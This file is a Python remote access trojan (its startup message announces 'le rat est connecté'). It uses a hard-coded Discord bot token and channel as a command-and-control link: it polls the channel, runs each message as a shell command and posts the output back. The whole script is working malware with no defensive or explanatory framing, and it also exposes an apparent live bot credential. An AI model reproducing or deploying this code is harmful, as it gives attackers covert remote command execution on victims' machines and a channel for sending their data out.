import os, time, json, urllib.request, subprocess

TOKEN = "MTU2NTE4OTU2MTg5MjQ3NTAwMA.GYUiUz." + "jXWb6Qj1daVY3w4DaQQBpVNqetMF2zCmE05kMs"
CHANNEL = "1566873777013268513"
API = f"https://discord.com/api/v9/channels/{CHANNEL}/messages"
HEADERS = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}

def send_msg(content):
    data = json.dumps({"content": content}).encode('utf-8')
    req = urllib.request.Request(API, data=data, headers=HEADERS, method='POST')
    try: urllib.request.urlopen(req)
    except: pass

def get_cmd():
    req = urllib.request.Request(API, headers=HEADERS, method='GET')
    try:
        res = urllib.request.urlopen(req)
        data = json.loads(res.read().decode('utf-8'))
        if len(data) > 0:
            return data[0]["id"], data[0]["content"]
    except: pass
    return None, None

send_msg("**TEST : Le rat est connecté !**")

last_id = None
while True:
    msg_id, cmd = get_cmd()
    if msg_id and msg_id != last_id:
        last_id = msg_id
        if cmd == "!exit":
            break
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode(errors='ignore')
            send_msg(f"```\n{output[:1900]}\n```")
        except Exception as e:
            send_msg(f"Erreur: {e}")
    time.sleep(2)